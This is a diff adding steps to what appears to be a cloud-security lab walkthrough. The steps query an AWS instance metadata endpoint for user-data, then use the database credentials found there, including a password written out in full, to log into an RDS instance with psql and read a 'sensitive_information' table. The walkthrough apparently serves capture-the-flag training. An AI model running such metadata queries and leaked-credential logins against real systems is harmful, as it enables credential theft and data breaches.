@@ -2071,3 +2071,25 @@ ssh -i ec2_ssh_key ubuntu@<instance ip>
 <p align="center">
   <img src="/images/cloud/ssh_into_solo.png">
 </p>
+
+* Querying for metadata in the instance.
+
+```bash
+curl http://169.254.169.254/latest/user-data
+```
+
+<p align="center">
+  <img src="/images/cloud/psql_user_data.png">
+</p>
+
+* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.
+
+```bash
+psql postgresql://cgadmin:wagrrrrwwgahhhhwwwrrggawwwwwwrr@<rds-instance>:5432/securedb
+\d
+select * from sensitive_information;
+```
+
+<p align="center">
+  <img src="/images/cloud/flag_codebuild_solo.png">
+</p>
